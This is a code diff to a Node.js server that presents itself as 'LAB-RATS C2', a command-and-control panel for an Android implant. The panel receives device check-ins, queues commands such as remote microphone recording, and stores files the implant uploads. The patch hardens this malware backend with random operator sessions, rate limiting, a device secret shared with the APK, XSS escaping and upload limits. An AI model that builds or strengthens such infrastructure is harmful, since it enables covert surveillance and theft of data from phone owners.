@@ -1,13 +1,77 @@
 // Render Deploy Trigger v1.6.0-blob-engine
+// [PATCH task-5] Real operator auth (random sessions), password policy,
+// device credential (X-Device-Secret), XSS escaping, upload hardening.
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
+const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
-let currentC2Password = C2_PASSWORD;
+
+// ---- Password policy: no admin1337 fallback ----
+const C2_PASSWORD = process.env.C2_PASSWORD || '';
+if (!C2_PASSWORD || C2_PASSWORD === 'admin1337') {
+    console.error('[LAB-RATS C2] FATAL: C2_PASSWORD is not set or equals the forbidden default "admin1337". Set a strong C2_PASSWORD (>=12 chars) before starting.');
+    process.exit(1);
+}
+if (C2_PASSWORD.length < 12) {
+    console.warn('[LAB-RATS C2] WARNING: C2_PASSWORD is shorter than 12 characters. Consider a stronger passphrase.');
+}
+
+// ---- Device credential for /checkin /tunnel-poll /tunnel-response /upload ----
+const DEVICE_SECRET = process.env.DEVICE_SECRET || '';
+if (!DEVICE_SECRET) {
+    console.warn('[LAB-RATS C2] WARNING: DEVICE_SECRET is not set. Device endpoints will reject every request with 401 until DEVICE_SECRET is configured and matches the secret injected into the APK (build-env -> BuildConfig via local.properties).');
+}
+function deviceSecretOk(req) {
+    if (!DEVICE_SECRET) return false;
+    const provided = req.headers['x-device-secret'] || '';
+    if (typeof provided !== 'string' || provided.length !== DEVICE_SECRET.length) return false;
+    try {
+        return crypto.timingSafeEqual(Buffer.from(provided, 'utf8'), Buffer.from(DEVICE_SECRET, 'utf8'));
+    } catch (e) { return false; }
+}
+
+// ---- Operator sessions: crypto.randomBytes(32) tokens, in-memory, 30 min TTL ----
+const SESSION_TTL_MS = 30 * 60 * 1000;
+const sessions = new Map(); // token -> expiresAt (epoch ms)
+function createSession() {
+    const token = crypto.randomBytes(32).toString('hex');
+    sessions.set(token, Date.now() + SESSION_TTL_MS);
+    return token;
+}
+function pruneSessions() {
+    const now = Date.now();
+    for (const [token, exp] of sessions) {
+        if (exp <= now) sessions.delete(token);
+    }
+}
+setInterval(pruneSessions, 60 * 1000).unref();
+
+// ---- Login rate limiting: per-IP, 5 failures -> 10 min lockout ----
+const LOGIN_LOCK_MS = 10 * 60 * 1000;
+const LOGIN_MAX_FAILURES = 5;
+const loginFailures = new Map(); // ip -> { count, lockedUntil }
+function loginLocked(ip) {
+    const rec = loginFailures.get(ip);
+    if (!rec) return false;
+    if (rec.lockedUntil && Date.now() < rec.lockedUntil) return true;
+    if (rec.lockedUntil && Date.now() >= rec.lockedUntil) { loginFailures.delete(ip); return false; }
+    return false;
+}
+function recordLoginFailure(ip) {
+    const rec = loginFailures.get(ip) || { count: 0, lockedUntil: 0 };
+    rec.count += 1;
+    if (rec.count >= LOGIN_MAX_FAILURES) {
+        rec.lockedUntil = Date.now() + LOGIN_LOCK_MS;
+        rec.count = 0;
+        console.warn(`[LAB-RATS C2] Login locked for 10 minutes from IP ${ip} after ${LOGIN_MAX_FAILURES} failures.`);
+    }
+    loginFailures.set(ip, rec);
+}
+function recordLoginSuccess(ip) { loginFailures.delete(ip); }
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -18,7 +82,8 @@ const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) {
     fs.mkdirSync(UPLOADS_DIR, { recursive: true });
 }
-app.use('/c2/downloads', express.static(UPLOADS_DIR));
+// NOTE: /c2/downloads is mounted later with an operator-session guard
+// (was previously an unauthenticated static directory).
 
 const devices = new Map();
 const commandQueues = new Map();
@@ -116,10 +181,42 @@ function getCookie(cookieHeader, name) {
     return matches ? decodeURIComponent(matches[1]) : null;
 }
 
-function isAuthenticated(req) {
-    const token = getCookie(req.headers.cookie, 'c2_auth_token');
-    return token === 'AUTH_OK_1337';
+// HTML-escape for any device/operator-supplied string rendered into the panel
+function escapeHtml(s) {
+    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+    }[c]));
 }
+
+// JS-string-literal-safe for values embedded in inline onclick attributes
+function jsStr(s) {
+    return String(s == null ? '' : s)
+        .replace(/\\/g, '\\\\')
+        .replace(/'/g, "\\'")
+        .replace(/</g, '\\u003c')
+        .replace(/>/g, '\\u003e');
+}
+
+function isAuthenticated(req) {
+    // Valid operator session: random token stored in the in-memory session table,
+    // accepted via cookie (preferred) or ?token= (for /c2/downloads links).
+    const token = getCookie(req.headers.cookie, 'c2_auth_token') ||
+        ((req.query && req.query.token) ? String(req.query.token) : '');
+    if (!token) return false;
+    const exp = sessions.get(token);
+    if (!exp) return false;
+    if (Date.now() >= exp) { sessions.delete(token); return false; }
+    return true;
+}
+
+// Guarded exfiltration vault: operator session required (cookie or ?token=)
+app.use('/c2/downloads', (req, res, next) => {
+    if (isAuthenticated(req)) return next();
+    return res.status(401).send('UNAUTHORIZED: valid operator session required');
+}, express.static(UPLOADS_DIR));
+
+// Render health check endpoint (anonymous, always 200)
+app.get('/healthz', (req, res) => res.status(200).send('ok'));
 
 function dispatchCommand(deviceId, cmd) {
     let waiters = longPollWaiters.get(deviceId) || [];
@@ -174,23 +271,41 @@ function serveLoginPage(req, res, errorMsg = '') {
     res.send(html);
 }
 
-// LOGIN HANDLER
+// LOGIN PAGE (GET) — anonymous
+app.get('/login', (req, res) => serveLoginPage(req, res));
+
+// LOGIN HANDLER (POST) — constant-time compare + per-IP rate limit + random session
 app.post('/login', (req, res) => {
     try {
-        const { password } = req.body || {};
-        const validPass = currentC2Password || C2_PASSWORD || 'admin1337';
-        if (password === validPass) {
-            res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
+        const ip = req.ip || req.socket.remoteAddress || 'unknown';
+        if (loginLocked(ip)) {
+            return serveLoginPage(req, res, 'LOCKED: too many failed attempts. Retry in 10 minutes.');
+        }
+        const provided = Buffer.from(String((req.body && req.body.password) || ''), 'utf8');
+        const expected = Buffer.from(C2_PASSWORD, 'utf8');
+        let ok = provided.length === expected.length;
+        if (ok) {
+            try { ok = crypto.timingSafeEqual(provided, expected); } catch (e) { ok = false; }
+        }
+        if (ok) {
+            recordLoginSuccess(ip);
+            const token = createSession();
+            console.log(`[LAB-RATS C2] Operator login success from ${ip}`);
+            res.setHeader('Set-Cookie', `c2_auth_token=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${SESSION_TTL_MS / 1000}`);
             return res.redirect('/');
         }
+        recordLoginFailure(ip);
         return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
     } catch (err) {
-        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
+        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + escapeHtml(err.message));
     }
 });
 
 // Ingestion Handler for device check-ins
 function handleCheckin(req, res) {
+    if (!deviceSecretOk(req)) {
+        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
+    }
     try {
         const contentType = req.headers['content-type'] || '';
         if (contentType.includes('multipart/form-data')) {
@@ -232,8 +347,14 @@ function handleCheckin(req, res) {
     }
 }
 
-// File Upload / Exfiltration Handler
+// File Upload / Exfiltration Handler (device credential required, 50MB cap, extension whitelist)
+const MAX_UPLOAD_BYTES = 50 * 1024 * 1024;
+const ALLOWED_EXT = /\.(jpe?g|png|gif|webp|bmp|mp4|m4a|aac|3gp|amr|wav|mp3|txt|log|json|zip|pdf)$/i;
+
 function handleFileUpload(req, res) {
+    if (!deviceSecretOk(req)) {
+        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
+    }
     try {
         const contentType = req.headers['content-type'] || '';
         const deviceId = req.headers['x-device-id'] || req.query.deviceId || 'Unknown_Target';
@@ -242,15 +363,34 @@ function handleFileUpload(req, res) {
             return res.status(400).json({ success: false, error: 'Expected multipart/form-data' });
         }
 
+        const declaredLength = parseInt(req.headers['content-length'] || '0', 10);
+        if (declaredLength > MAX_UPLOAD_BYTES) {
+            return res.status(413).json({ success: false, error: 'Upload exceeds 50MB limit' });
+        }
+
         const boundary = contentType.split('boundary=')[1];
         if (!boundary) {
             return res.status(400).json({ success: false, error: 'No boundary found' });
         }
 
         let bodyBuffer = [];
-        req.on('data', chunk => bodyBuffer.push(chunk));
+        let totalBytes = 0;
+        let tooLarge = false;
+        req.on('data', chunk => {
+            totalBytes += chunk.length;
+            if (totalBytes > MAX_UPLOAD_BYTES) {
+                tooLarge = true;
+                if (!res.headersSent) {
+                    res.status(413).json({ success: false, error: 'Upload exceeds 50MB limit' });
+                }
+                req.destroy();
+                return;
+            }
+            bodyBuffer.push(chunk);
+        });
         req.on('end', () => {
             try {
+                if (tooLarge) return;
                 const buffer = Buffer.concat(bodyBuffer);
                 const boundaryStr = '--' + boundary;
                 const parts = buffer.toString('binary').split(boundaryStr);
@@ -261,6 +401,12 @@ function handleFileUpload(req, res) {
                     if (part.includes('filename="')) {
                         const filenameMatch = part.match(/filename="([^"]+)"/);
                         const filename = filenameMatch ? filenameMatch[1] : `exfil_${Date.now()}.dat`;
+
+                        // Extension whitelist — reject unsupported file types
+                        if (!ALLOWED_EXT.test(filename)) {
+                            console.warn(`[EXFIL REJECTED] Extension not whitelisted: ${filename} (device ${deviceId})`);
+                            return res.status(400).json({ success: false, error: 'File extension not allowed' });
+                        }
 
                         const headerEnd = part.indexOf('\r\n\r\n');
                         if (headerEnd !== -1) {
@@ -322,6 +468,9 @@ app.post('/upload', handleFileUpload);
 
 // Device command polling with Instant Long-Polling
 function handleTunnelPoll(req, res) {
+    if (!deviceSecretOk(req)) {
+        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
+    }
     const id = req.query.deviceId;
     if (!id) return res.json({});
 
@@ -357,6 +506,9 @@ app.get('/checkin/tunnel-poll', handleTunnelPoll);
 
 // Device command response
 function handleTunnelResponse(req, res) {
+    if (!deviceSecretOk(req)) {
+        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
+    }
     const data = req.body || {};
     const pending = pendingResponses.get(data.id);
     if (pending) {
@@ -373,9 +525,28 @@ app.post('/tunnel-response', handleTunnelResponse);
 app.post('/checkin/tunnel-response', handleTunnelResponse);
 
 // AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
-// Bypassed: Authentication is handled exclusively on-device via PasswordHasher / FirebaseConfig
+// Device routes (/checkin /upload /tunnel-poll /tunnel-response, registered above)
+// authenticate with X-Device-Secret inside their own handlers and never reach here.
+// Everything after this point (panel, /api/*, /proxy/*, /c2-dashboard) requires
+// a valid operator session. GET / with check-in query params + device secret
+// is still passed through so devices can check in via the root path.
 app.use((req, res, next) => {
-    return next();
+    if (isAuthenticated(req)) return next();
+
+    if (deviceSecretOk(req) && req.method === 'GET' && req.path === '/' &&
+        req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
+        return next(); // device check-in via GET /?ip=... (handled by GET / below)
+    }
+
+    if (req.path === '/favicon.ico') return res.status(404).end();
+    if (req.path === '/healthz') return res.status(200).send('ok');
+
+    // Panel: redirect browser to the login page (no device data rendered without session)
+    if (req.method === 'GET' && req.path === '/') {
+        return res.redirect('/login');
+    }
+    // API / proxy / downloads / other operator paths: explicit 401
+    return res.status(401).json({ success: false, error: 'Unauthorized: valid operator session required' });
 });
 
 // Delete Exfiltrated File Endpoint
@@ -457,21 +628,21 @@ app.get('/', (req, res) => {
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
                     <div style="display: inline-flex; align-items: center; gap: 5px; vertical-align: middle;">
-                        <span onclick="renameDevice('${d.deviceId}', '${(d.alias || '').replace(/'/g, "\\'")}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
-                        <span>${displayName}</span><span style="color:#666; font-size:0.68rem;">${subName}</span>
+                        <span onclick="renameDevice('${jsStr(d.deviceId)}', '${jsStr(d.alias || '')}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
+                        <span>${escapeHtml(displayName)}</span><span style="color:#666; font-size:0.68rem;">${escapeHtml(subName)}</span>
                     </div>
                 </td>
-                <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
-                <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
-                <td style="vertical-align: middle;">${d.battery || '100%'}</td>
-                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
+                <td style="vertical-align: middle;">${escapeHtml(d.model || 'SM-F731W')}</td>
+                <td style="vertical-align: middle;">Android ${escapeHtml(d.os || '16')}</td>
+                <td style="vertical-align: middle;">${escapeHtml(d.battery || '100%')}</td>
+                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${escapeHtml(d.ip || 'N/A')}:${escapeHtml(String(d.port || '9191'))}</td>
                 <td style="vertical-align: middle;">${statusBadge}</td>
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
                     <div style="display: inline-flex; align-items: center; gap: 8px;">
                         <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
-                        <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
+                        <select onchange="dispatchQuickCommand('${jsStr(d.deviceId)}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
                             <option value="" disabled selected>⚡ ACTIONS</option>
                             <option value="mic">🎙️ Record Mic (60s)</option>
                             <option value="flashlight">🔦 Toggle Flashlight</option>
@@ -494,14 +665,14 @@ app.get('/', (req, res) => {
             const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
             return `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${f.originalName}</td>
-                <td style="vertical-align: middle; color: #aaa;">${devLabel}</td>
+                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${escapeHtml(f.originalName)}</td>
+                <td style="vertical-align: middle; color: #aaa;">${escapeHtml(devLabel)}</td>
                 <td style="vertical-align: middle; font-family: monospace;">${formatFileSize(f.size)}</td>
                 <td style="font-size: 0.68rem; color: #aaa; vertical-align: middle;">${formatTime(f.timestamp)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
                     <div style="display: inline-flex; align-items: center; gap: 6px;">
-                        <a href="/c2/downloads/${f.filename}" download="${f.originalName}" style="background: var(--neon-green); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">DOWNLOAD</a>
-                        <button onclick="deleteExfil('${f.id}')" style="background: rgba(255,49,49,0.15) !important; border: 1px solid var(--danger) !important; color: var(--danger) !important; padding: 5px 12px !important; border-radius: 6px !important; font-weight: bold !important; font-size: 0.65rem !important; cursor: pointer; outline: none; margin: 0 !important; width: auto !important; height: auto !important; display: inline-block !important;">DELETE</button>
+                        <a href="/c2/downloads/${encodeURIComponent(f.filename)}" download="${escapeHtml(f.originalName)}" style="background: var(--neon-green); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">DOWNLOAD</a>
+                        <button onclick="deleteExfil('${jsStr(f.id)}')" style="background: rgba(255,49,49,0.15) !important; border: 1px solid var(--danger) !important; color: var(--danger) !important; padding: 5px 12px !important; border-radius: 6px !important; font-weight: bold !important; font-size: 0.65rem !important; cursor: pointer; outline: none; margin: 0 !important; width: auto !important; height: auto !important; display: inline-block !important;">DELETE</button>
                     </div>
                 </td>
             </tr>
